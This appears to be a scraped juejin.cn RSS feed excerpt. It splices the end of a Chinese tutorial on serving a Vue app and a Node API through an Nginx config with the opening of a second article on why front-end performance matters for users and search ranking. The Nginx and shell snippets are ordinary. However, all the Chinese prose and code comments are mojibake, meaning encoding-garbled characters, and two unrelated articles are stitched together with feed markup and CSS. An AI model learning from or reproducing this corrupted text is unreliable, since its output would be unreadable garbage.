<p>éƒ¨ç½²ä¸Šçº¿åï¼Œå¸¸è§çš„é—®é¢˜æ˜¯åˆ·æ–°é¡µé¢ 404ï¼Œæˆ–è€…æ¥å£è¯·æ±‚ 404ã€‚è¿™æ˜¯å› ä¸ºçº¿ä¸Šå¤±å»äº† Vite çš„å¼€å‘ä»£ç†ï¼Œå¿…é¡»é  Nginxã€‚</p>
<h4 data-id="heading-10">1. ç»Ÿä¸€æ¥å£å‰ç¼€</h4>
<p>ä¸ºäº†æ–¹ä¾¿ Nginx è½¬å‘ï¼Œå»ºè®®å‰åç«¯ç»Ÿä¸€ä½¿ç”¨Â /apiÂ å‰ç¼€ã€‚</p>
<ul>
<li><strong>å‰ç«¯</strong>ï¼š.env.productionÂ è®¾ç½®Â VITE_API_BASE_URL = '/api'</li>
<li><strong>åç«¯</strong>ï¼šExpress å…¥å£æ–‡ä»¶æŒ‚è½½Â app.use('/api/auth', authRouter)</li>
</ul>
<h4 data-id="heading-11">2. Nginx é…ç½® (å®Œæ•´ç‰ˆ)</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># HTTP å¼ºåˆ¶è·³è½¬ HTTPS (ä¿æŒä¸å˜)</span>
server {
    listen 80;
    server_name ifxia.xyz;
    <span class="hljs-built_in">return</span> 301 https://$host<span class="hljs-variable">$request_uri</span>;
}

<span class="hljs-comment"># HTTPS æœåŠ¡å™¨</span>
server {
    listen 443 ssl;
    server_name ifxia.xyz;

    <span class="hljs-comment"># SSL é…ç½® (ä¿æŒä½ åŸæ¥çš„)</span>
    ssl_certificate /etc/letsencrypt/live/ifxia.xyz/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/ifxia.xyz/privkey.pem;

<span class="hljs-comment"># è¿™æ · /var/www/html ä¸‹çš„ index.html å°±å˜æˆäº†å®˜ç½‘</span>
    root /var/www/html;
    index index.html index.htm;



    <span class="hljs-comment"># --- 1. å‰ç«¯é…ç½® (å­è·¯å¾„) ---</span>
    location /vue-admin-template {
        <span class="hljs-comment"># ä½¿ç”¨ alias æŒ‡å‘å­˜æ”¾å‰ç«¯ä»£ç çš„å®é™…ç›®å½•</span>
        <span class="hljs-built_in">alias</span> /var/www/html/vue-admin-template;
        index index.html;
        <span class="hljs-comment"># è§£å†³ Vue Router åˆ·æ–° 404 é—®é¢˜</span>
        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /vue-admin-template/index.html;
    }


   
    <span class="hljs-comment"># --- 2. åç«¯æ¥å£ (ç»Ÿä¸€å…¥å£) ---</span>
    <span class="hljs-comment"># åªè¦æ˜¯ /api å¼€å¤´çš„ï¼Œå…¨éƒ¨ç»™ Node.js</span>
    location /api/ {
        <span class="hljs-comment"># âš ï¸ æ³¨æ„ï¼šè¿™é‡Œç»“å°¾ä¸è¦åŠ  /</span>
        <span class="hljs-comment"># ä¸åŠ  / æ„å‘³ç€ï¼šæŠŠ /api/auth/login åŸæ ·å‘ç»™ Node</span>
        <span class="hljs-comment"># å› ä¸ºNodeç«¯å·²ç»é…ç½®äº† app.use('/api/auth', ...)ï¼Œæ‰€ä»¥æ­£å¥½åŒ¹é…</span>
        proxy_pass http://localhost:3000;
        
        proxy_set_header Host <span class="hljs-variable">$host</span>;
        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;
        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;
    }
  
}
</code></pre>
<p>éªŒè¯å¹¶é‡å¯nginx</p>
<pre><code class="hljs language-js" lang="js">nginx -t

systemctl reload nginx
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§é“è‡³ç®€ï¼šä¸‡å­—æ¼«è°ˆå‰ç«¯æ€§èƒ½ç›‘æ§]]></title>    <link>https://juejin.cn/post/7583973472324009999</link>    <guid>https://juejin.cn/post/7583973472324009999</guid>    <pubDate>2025-12-16T06:38:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973472324009999" data-draft-id="7583973472323895311" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§é“è‡³ç®€ï¼šä¸‡å­—æ¼«è°ˆå‰ç«¯æ€§èƒ½ç›‘æ§"/> <meta itemprop="keywords" content="å‰ç«¯,æ€§èƒ½ä¼˜åŒ–,JavaScript"/> <meta itemprop="datePublished" content="2025-12-16T06:38:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="tabzzz"/> <meta itemprop="url" content="https://juejin.cn/user/2571086155752654"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§é“è‡³ç®€ï¼šä¸‡å­—æ¼«è°ˆå‰ç«¯æ€§èƒ½ç›‘æ§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2571086155752654/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    tabzzz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:38:34.000Z" title="Tue Dec 16 2025 06:38:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»24åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨2025å¹´çš„ä»Šå¤©ï¼Œé’ˆå¯¹xxç›‘æ§è¿™å‡ ä¸ªå­—çœ¼å·²ç»æœ‰ç‚¹â€œè€ç”Ÿå¸¸è°ˆâ€çš„æ„Ÿè§‰äº†ï¼Œæ— è®ºæ˜¯ä»€ä¹ˆæ•°æ®ç›‘æ§ã€å¼‚å¸¸ç›‘æ§æˆ–è€…æ˜¯æœ¬æ–‡å³å°†è¦åˆ†äº«çš„æ€§èƒ½ç›‘æ§ï¼Œåœ¨å½“ä»Šä»–ä»¬å¹¶ä¸æ˜¯åšä¸ºä¸€ç§â€œæ–°ä¸œè¥¿â€æ¥ä¾›å¤§å®¶å­¦ä¹ ï¼Œè€Œæ˜¯ç»å¸¸ä»¥ä¸€ç§â€œè€æœ‹å‹â€çš„å§¿æ€å’Œå¤§å®¶è§é¢ã€‚</p>
<p>éšç€å‰ç«¯é¡µé¢çš„æ—¥ç›Šå¤æ‚ï¼Œäº¤äº’ã€åˆå§‹åŒ–ç­‰åŠŸèƒ½ä¸æ–­å¢åŠ ï¼Œæ€§èƒ½ç›‘æ§å·²ç»ä¸å†æ˜¯ä¸€ä¸ªå¯é€‰çš„é™„åŠ é¡¹ï¼Œè€Œæ˜¯å¼€å‘è¿‡ç¨‹ä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ã€‚æˆ‘ä»¬å¯ä»¥æŠŠæ€§èƒ½ç›‘æ§æ¯”ä½œå‰ç«¯å¼€å‘ä¸­çš„â€œå¥åº·æ£€æŸ¥â€ï¼Œå®ƒåƒæ˜¯åŒ»ç”Ÿå¯¹é¡µé¢çš„ä½“æ£€ï¼Œå¸®åŠ©æˆ‘ä»¬åŠæ—¶å‘ç°æ½œåœ¨çš„é—®é¢˜ï¼Œé¿å…é‚£äº›ç”¨æˆ·ä½“éªŒä¸Šçš„â€œéšå½¢æ€æ‰‹â€ã€‚</p>
<p>è¿˜æ˜¯é‚£å¥è¯ï¼Œè°ä¸æƒ³è®©ç½‘é¡µå¿«ä¸€ç‚¹ã€è®¿é—®èµ·æ¥çˆ½ä¸€äº›å‘¢ï¼Ÿ</p>
<h2 data-id="heading-1">ç½‘ç«™æ€§èƒ½çš„å½±å“</h2>
<h3 data-id="heading-2">å¯¹ç”¨æˆ·çš„å½±å“</h3>
<p>ä½ æ‰“å¼€ç½‘ç«™å¯ä»¥ç­‰å¾…çš„æ—¶é—´æ˜¯å¤šå°‘å‘¢ï¼Ÿä½ æ˜¯å¦ç¡®å®šç”¨æˆ·ä¸ºäº†è®¿é—®ä½ çš„ç½‘ç«™å¯ä»¥ç­‰ä¸Š1ç§’ï¼Ÿ5ç§’ï¼Ÿæˆ–è€…æ˜¯10ç§’å—ğŸ¤”ï¼Ÿ</p>
<p>å°±æˆ‘ä¸ªäººæ¥è¯´ï¼Œåœ¨è®¿é—®å„ç±»ç½‘ç«™æ—¶ï¼Œå¦‚æœå“åº”æ—¶é—´è¿‡é•¿çš„è¯ä¼šè®©æˆ‘è§‰å¾—å¾ˆâ€œä¸èˆ’æœâ€ï¼Œå¯èƒ½åœ¨æŸäº›PCç­‰ä¹…ç‚¹ä¼šå¥½ä¸€äº›ï¼Œä½†æ˜¯å¦‚æœæ˜¯ç§»åŠ¨ç«¯ï¼Œé‚£ç®€ç›´æ˜¯â€œæ— æ³•å¿å—â€çš„ç¨‹åº¦ã€‚</p>
<p>äº‹å®ä¸Šï¼Œæœ‰ç»Ÿè®¡æŒ‡å‡ºåŠ è½½å»¶è¿Ÿæ¯å¢åŠ <strong>100æ¯«ç§’ï¼Œç”¨æˆ·æ»¡æ„åº¦ä¸‹é™çº¦1%ï¼Œ<strong>ä¸€èˆ¬æ¥è¯´ï¼Œ<strong>ç½‘ç«™å“åº”æ—¶é—´2ç§’ä»¥å†…</strong>é€šå¸¸è¢«è®¤ä¸ºæ˜¯ç”¨æˆ·å¯æ¥å—çš„é˜ˆå€¼ï¼Œè¶…è¿‡3ç§’æ—¶ï¼Œç”¨æˆ·æµå¤±ç‡æ˜¾è‘—å¢åŠ ï¼Œå½“ç­‰å¾…æ—¶é—´è¶…è¿‡</strong>8ç§’</strong>æ—¶ï¼Œå¤§å¤šæ•°ç”¨æˆ·ä¼šæ”¾å¼ƒè®¿é—®ï¼Œè¾¾åˆ°12ç§’åˆ™<strong>99%ä»¥ä¸Šç”¨æˆ·é€‰æ‹©å…³é—­ç½‘é¡µ</strong>ã€‚</p>
<p>å•çº¯ä»ç”¨æˆ·è½¬æ¢ç‡å’Œè·³å‡ºç‡æ¥è®²ï¼Œå¯èƒ½æ²¡æ³•ä»å†°å†·çš„æ•°å­—ä¸­æ„Ÿå—å‡ºç½‘ç«™æ€§èƒ½å¯¹ç”¨æˆ·æµå¤±çš„å½±å“æœ‰å¤šå¤§ï¼Œä½†æ˜¯å¯¹äºæŸäº›æ¯å¹´æœ‰å·¨å¤§è¥æ”¶çš„å…¬å¸æ¥è¯´ï¼Œè¿™ä¸€ç‚¹ç‚¹çš„å»¶è¿ŸåŠ è½½ä¼šå¯¹ä¸šåŠ¡é€ æˆæ²‰é‡çš„æ‰“å‡»ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0ebe186586a4b35937f9e51e7cddc7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=2t15SmC6Rw8fNbp5O3twQVXfzTk%3D" alt="Clipboard_Screenshot_1765866202.png" loading="lazy"/></p>
<p>äºšé©¬é€Šå‰è½¯ä»¶å·¥ç¨‹å¸ˆ Greg Linden æ›¾åœ¨2006å¹´å‘ç°æ¯å¤šå‡º100mså»¶è¿Ÿå°±ä¼šå¯¼è‡´çº¦1%é”€å”®æŸå¤±ï¼Œå³ä½¿æ˜¯éå¸¸å°çš„å»¶è¿Ÿä¹Ÿä¼šå¯¼è‡´æ”¶å…¥å¤§å¹…ä¸‹é™ï¼Œä»£ä»·é«˜æ˜‚ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.conductor.com%2Facademy%2Fpage-speed-resources%2Ffaq%2Famazon-page-speed-study%2F" target="_blank" title="https://www.conductor.com/academy/page-speed-resources/faq/amazon-page-speed-study/" ref="nofollow noopener noreferrer">åŸæ–‡</a></p>
<h3 data-id="heading-3">å¯¹æœç´¢å¼•æ“çš„å½±å“</h3>
<p>é™¤äº†ç›´è§‚çš„å¯¹ç”¨æˆ·é€ æˆå½±å“ä»¥å¤–ï¼Œæ€§èƒ½å› ç´ å¯¹æœç´¢å¼•æ“çš„æ’åä¹Ÿæœ‰è¾ƒå¤§çš„å½±å“ã€‚</p>
<p>æ—©åœ¨2010å¹´ï¼ŒGoogleåœ¨æ’åç®—æ³•ä¸­å°±å·²ç»æŠŠé¡µé¢åŠ è½½é€Ÿåº¦ä½œä¸ºä¸€ä¸ªé‡è¦å› ç´ ã€‚é¡µé¢åŠ è½½é€Ÿåº¦è¶Šå¿«ï¼Œæœç´¢å¼•æ“è¶Šå¯èƒ½ç»™äºˆè¯¥é¡µé¢æ›´é«˜çš„æ’åã€‚åä¹‹ï¼Œå¦‚æœé¡µé¢åŠ è½½ç¼“æ…¢ï¼Œæœç´¢å¼•æ“å¯èƒ½ä¼šé™ä½å…¶åœ¨æœç´¢ç»“æœä¸­çš„æ’åï¼Œå¯¼è‡´ç½‘ç«™æµé‡ä¸‹é™ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6cb868d2d9e43a88c245d8a8773c969~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=m871NSqZ%2By9OGHNGZYgytWsTgi8%3D" alt="Clipboard_Screenshot_1765866216.png" loading="lazy"/></p>
<p>Googleåœ¨2018å¹´å‘å¸ƒäº† <strong>â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.google.com%2Fsearch%2Fdocs%2Fcrawling-indexing%2Fmobile%2Fmobile-sites-mobile-first-indexing%3Fhl%3Dzh-cn" target="_blank" title="https://developers.google.com/search/docs/crawling-indexing/mobile/mobile-sites-mobile-first-indexing?hl=zh-cn" ref="nofollow noopener noreferrer">Mobile-First Indexing</a>â€</strong> ï¼Œå³ä¼˜å…ˆä½¿ç”¨ç§»åŠ¨ç‰ˆå†…å®¹æ¥è¿›è¡Œæ’åã€‚å¦‚æœç½‘ç«™åœ¨ç§»åŠ¨ç«¯åŠ è½½ç¼“æ…¢æˆ–è€…äº¤äº’ä½“éªŒå·®ï¼Œæœç´¢å¼•æ“ä¼šä¼˜å…ˆé™çº§è¯¥ç½‘ç«™çš„æ’åï¼Œå½±å“å…¶åœ¨æœç´¢ç»“æœä¸­çš„è¡¨ç°ã€‚</p>
<p>æ€»è€Œè¨€ä¹‹è¨€è€Œæ€»ä¹‹ï¼Œåœ¨ç°ä»£å¼€å‘ä¸­ï¼Œæƒ³è¦ä½ è‡ªå·±çš„åº”ç”¨åœ¨æœç´¢å¼•æ“ä¸­è„±é¢–è€Œå‡ºï¼Œæ€§èƒ½æ—©å·²æ˜¯ä¸å¯å¿½ç•¥çš„å…³é”®å› ç´ ã€‚</p>
